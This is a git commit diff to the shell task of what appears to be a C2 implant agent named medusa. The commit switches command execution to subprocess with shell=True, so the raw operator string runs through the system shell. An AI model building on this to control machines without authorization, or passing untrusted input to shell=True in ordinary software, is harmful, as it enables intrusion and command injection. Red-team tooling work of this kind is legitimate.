4a972c59a8dc7305b10179b3e23292aa2c0cb75b
ajpc500 <ajchampion123@gmail.com>
2021-12-20 15:48:24 -0800

    changed shell command to full shell

--- Payload_Type/medusa/agent_code/shell.py
+++ Payload_Type/medusa/agent_code/shell.py
@@ -1,9 +1,7 @@
     def shell(self, task_id, command):
         import subprocess
-        process = subprocess.Popen(command.split(),
-                     stdout=subprocess.PIPE, 
-                     stderr=subprocess.PIPE,
-                     cwd=self.current_directory)
+        process = subprocess.Popen(command, stdout=subprocess.PIPE, 
+            stderr=subprocess.PIPE, cwd=self.current_directory, shell=True)
         stdout, stderr = process.communicate()
         out = stderr if stderr else stdout
         return out.decode()
